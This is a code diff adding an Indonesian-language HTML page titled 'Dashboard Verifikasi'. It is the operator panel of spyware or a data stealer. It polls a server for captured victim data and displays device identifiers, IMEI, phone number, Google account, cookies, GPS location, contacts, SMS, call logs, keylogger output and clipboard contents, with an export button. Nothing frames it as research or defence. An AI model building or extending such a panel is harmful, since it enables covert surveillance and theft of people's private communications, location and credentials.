@@ -1,0 +1,121 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1.0">
+    <title>Dashboard - Verifikasi</title>
+    <style>
+        *{margin:0;padding:0;box-sizing:border-box}
+        body{font-family:monospace;background:#0a0a0a;color:#0f0;padding:10px;font-size:12px}
+        h1{color:#0f8;text-align:center;margin:10px 0;font-size:18px}
+        .p{background:#111;border:1px solid #333;padding:10px;margin:8px 0;border-radius:5px}
+        h2{color:#0f8;font-size:14px;margin:10px 0;border-bottom:1px solid #333;padding-bottom:5px}
+        #lg{background:#000;padding:8px;height:400px;overflow-y:auto;font-size:10px;margin-top:5px}
+        .r{padding:3px 0;border-bottom:1px solid #1a1a1a;font-size:11px}.lb{color:#888}
+        .bt{background:#0f0;color:#000;border:none;padding:8px 16px;border-radius:3px;cursor:pointer;font-weight:bold;margin:3px;font-size:12px}
+        .bt.red{background:#f44}
+        input{background:#222;border:1px solid #333;color:#0f0;padding:8px;border-radius:3px;margin:5px;width:200px}
+        .stat-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(90px,1fr));gap:6px;margin:8px 0}
+        .stat-card{background:#111;padding:8px;border-radius:5px;border:1px solid #333;text-align:center}
+        .stat-card .num{color:#0f8;font-size:20px;font-weight:bold}.stat-card .label{color:#888;font-size:9px}
+        table{width:100%;border-collapse:collapse;margin:5px 0;font-size:11px}td,th{border:1px solid #333;padding:4px 6px}th{background:#1a1a1a;color:#0f8}td{color:#ccc;word-break:break-all}
+        pre{background:#000;padding:8px;border-radius:5px;overflow-x:auto;font-size:10px;color:#0f0;max-height:200px;overflow-y:auto}
+    </style>
+</head>
+<body>
+    <h1>🎯 DASHBOARD VERIFIKASI</h1>
+    <div class="p">
+        <input type="password" id="pw" placeholder="Password">
+        <button class="bt" onclick="login()">🔓 Buka</button>
+        <span style="color:#888;font-size:10px;margin-left:10px" id="st">● Silakan login</span>
+    </div>
+    <div id="main" style="display:none">
+        <div class="p"><h2>📊 Statistik</h2><div class="stat-grid" id="stats"></div></div>
+        <div class="p" id="dvInfo" style="display:none"><h2>📱 Device</h2><div id="dv"></div></div>
+        <div class="p" id="anInfo" style="display:none"><h2>🤖 Android</h2><div id="an"></div></div>
+        <div class="p" id="gpInfo" style="display:none"><h2>📍 GPS</h2><div id="gp"></div></div>
+        <div class="p" id="ktInfo" style="display:none"><h2>📇 Kontak</h2><div id="kt"></div></div>
+        <div class="p" id="smInfo" style="display:none"><h2>💬 SMS</h2><div id="sm"></div></div>
+        <div class="p" id="clInfo" style="display:none"><h2>📞 Call Log</h2><div id="cl"></div></div>
+        <div class="p" id="kyInfo" style="display:none"><h2>⌨️ Keylogger</h2><div id="ky"></div></div>
+        <div class="p" id="cpInfo" style="display:none"><h2>📋 Clipboard</h2><div id="cp"></div></div>
+        <div class="p" id="dlInfo" style="display:none"><h2>📥 Download</h2><div id="dl"></div></div>
+        <div class="p"><h2>📋 Log Lengkap</h2><div id="lg">Memuat...</div></div>
+        <button class="bt" onclick="exp()">📤 Export JSON</button>
+        <button class="bt red" onclick="hapus()">🗑️ Hapus Data</button>
+    </div>
+    <script>
+        var all = [], key = '';
+        
+        function login() {
+            key = document.getElementById('pw').value;
+            document.getElementById('main').style.display = 'block';
+            document.getElementById('st').innerHTML = '● Login sukses';
+            document.getElementById('st').style.color = '#0f0';
+            fd();
+            setInterval(fd, 3000);
+        }
+        
+        function fd() {
+            fetch('/data?key=' + key).then(function(r) { return r.json() }).then(function(d) {
+                all = d;
+                updateStats();
+                updateSections();
+                updateLog();
+                document.getElementById('st').innerHTML = '● ' + d.length + ' data - Live';
+                document.getElementById('st').style.color = '#0f0';
+            }).catch(function() {
+                document.getElementById('st').innerHTML = '● Offline / Password salah';
+                document.getElementById('st').style.color = '#f44';
+            });
+        }
+        
+        function updateStats() {
+            var t = {Total:all.length,Init:'init',Keylog:'keylogger',Kontak:'kontak_all',SMS:'sms_all',Call:'call_log',WA:'whatsapp',File:'files_all',App:'aplikasi_all',Kamera:'kamera',Clip:'clipboard',SS:'screenshot',GPS:'lokasi',IP:'ip',Download:'download'};
+            var h = '';
+            for(var k in t) { var v = t[k]; var c = (k==='Total'?all.length:all.filter(function(x){return x.sumber===v}).length); h += '<div class="stat-card"><div class="num">'+c+'</div><div class="label">'+k+'</div></div>' }
+            document.getElementById('stats').innerHTML = h;
+        }
+        
+        function gd(s) { var i = all.filter(function(x){return x.sumber===s}).pop(); return i ? i.data : null }
+        function sh(id, c) { document.getElementById(id).style.display = c ? 'block' : 'none' }
+        function tbl(d, cols, limit) { var list = Array.isArray(d) ? d : (d && d.data ? d.data : []); if(!Array.isArray(list)) list = []; var h = '<p style="color:#888">Total: '+list.length+'</p><table><tr>'; cols.forEach(function(c){ h += '<th>'+c+'</th>' }); h += '</tr>'; list.slice(0, limit||50).forEach(function(i){ h += '<tr>'; cols.forEach(function(c){ h += '<td>'+(i[c]||'?')+'</td>' }); h += '</tr>' }); h += '</table>'; return h }
+        
+        function updateSections() {
+            var init = gd('init');
+            sh('dvInfo', init);
+            if(init) { var h = '<table><tr><th>Key</th><th>Value</th></tr>'; h += '<tr><td>UA</td><td style="font-size:9px">'+(init.ua||'?')+'</td></tr>'; h += '<tr><td>Platform</td><td>'+(init.pl||'?')+'</td></tr>'; h += '<tr><td>Resolusi</td><td>'+(init.sc||'?')+'</td></tr>'; h += '<tr><td>Cookies</td><td style="max-width:200px;word-break:break-all">'+(init.co||'?')+'</td></tr>'; h += '</table>'; document.getElementById('dv').innerHTML = h }
+            
+            var ad = init && init.android ? init.android : null;
+            sh('anInfo', ad);
+            if(ad) { var h = '<table><tr><th>Key</th><th>Value</th></tr>'; if(ad.imei) h += '<tr><td style="color:#f44">IMEI</td><td style="color:#f44">'+ad.imei+'</td></tr>'; if(ad.phoneNumber) h += '<tr><td style="color:#ff0">No HP</td><td style="color:#ff0">'+ad.phoneNumber+'</td></tr>'; if(ad.googleAccount) h += '<tr><td style="color:#ff0">Google</td><td style="color:#ff0">'+JSON.stringify(ad.googleAccount)+'</td></tr>'; h += '</table>'; document.getElementById('an').innerHTML = h }
+            
+            var gps = all.filter(function(x){return x.sumber==='lokasi'}).pop();
+            sh('gpInfo', gps);
+            if(gps) document.getElementById('gp').innerHTML = 'Lat: '+gps.data.lat+' | Lon: '+gps.data.lon+'<br><a href="https://maps.google.com/?q='+gps.data.lat+','+gps.data.lon+'" target="_blank" style="color:#0af">📍 Buka Maps</a>';
+            
+            var kt = gd('kontak_all'); sh('ktInfo', kt); if(kt) document.getElementById('kt').innerHTML = tbl(kt, ['nama','nomor']);
+            var sm = gd('sms_all'); sh('smInfo', sm); if(sm) document.getElementById('sm').innerHTML = tbl(sm, ['address','body'], 30);
+            var cl = gd('call_log'); sh('clInfo', cl); if(cl) document.getElementById('cl').innerHTML = tbl(cl, ['number','duration'], 20);
+            
+            var ky = gd('keylogger'); sh('kyInfo', ky);
+            if(ky) { var h = '<table><tr><th>Field</th><th>Value</th></tr>'; for(var k in ky) { h += '<tr><td>'+k+'</td><td style="color:#f44;font-weight:bold">'+ky[k]+'</td></tr>' } h += '</table>'; document.getElementById('ky').innerHTML = h }
+            
+            var cp = gd('clipboard'); sh('cpInfo', cp); if(cp) document.getElementById('cp').innerHTML = '<pre style="color:#ff0;font-size:14px">'+(typeof cp==='string'?cp:JSON.stringify(cp))+'</pre>';
+            
+            var dl = all.filter(function(x){return x.sumber==='download'});
+            sh('dlInfo', dl.length>0);
+            if(dl.length>0) { var h = '<table><tr><th>File</th><th>Waktu</th></tr>'; dl.forEach(function(x){ h += '<tr><td>'+(x.data.file||'?')+'</td><td>'+new Date(x.waktu||Date.now()).toLocaleString('id-ID')+'</td></tr>' }); h += '</table>'; document.getElementById('dl').innerHTML = h }
+        }
+        
+        function updateLog() {
+            var lg = document.getElementById('lg');
+            if(all.length === 0) { lg.innerHTML = '<div style="color:#888;text-align:center;padding:50px">📭 Belum ada data</div>' }
+            else { lg.innerHTML = ''; all.slice(-100).reverse().forEach(function(i) { var div = document.createElement('div'); div.className = 'r'; var w = i.waktu ? new Date(i.waktu).toLocaleString('id-ID') : '?'; var s = i.sumber || '?'; var ds = ''; try{ds=JSON.stringify(i.data).substring(0,300)}catch(e){ds=String(i.data).substring(0,300)} div.innerHTML = '<span class="lb">['+w+']</span> <span style="color:#ff0">['+s+']</span> '+ds; lg.appendChild(div) }); lg.scrollTop = lg.scrollHeight }
+        }
+        
+        function exp() { var b = new Blob([JSON.stringify(all,null,2)], {type:'application/json'}); var a = document.createElement('a'); a.href = URL.createObjectURL(b); a.download = 'data-'+Date.now()+'.json'; a.click() }
+        function hapus() { if(confirm('Hapus semua data?')) { localStorage.removeItem('vd'); all = []; updateStats(); updateLog() } }
+    </script>
+</body>
+</html>
